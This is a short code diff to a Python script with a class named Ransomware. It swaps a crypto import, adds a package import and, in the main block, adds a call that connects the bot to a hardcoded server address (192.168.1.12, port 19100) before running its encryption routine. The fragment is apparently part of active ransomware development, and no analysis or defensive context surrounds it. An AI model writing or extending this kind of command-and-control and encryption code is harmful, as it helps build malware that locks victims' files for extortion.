@@ -1,6 +1,7 @@
+import __init__
 from time import sleep
 from modules.system import System
-from modules.crypto import Fernet, Encrypt, Decrypt
+from modules.encdec import Fernet, Encrypt, Decrypt
 from socket import socket, AF_INET, SOCK_STREAM
 
 
@@ -39,4 +40,5 @@ class Ransomware:
 
 if __name__ == '__main__':
     bot = Ransomware('192.168.1.12', 19100)
+    bot.ConnectServer()
     bot.Encrypted()
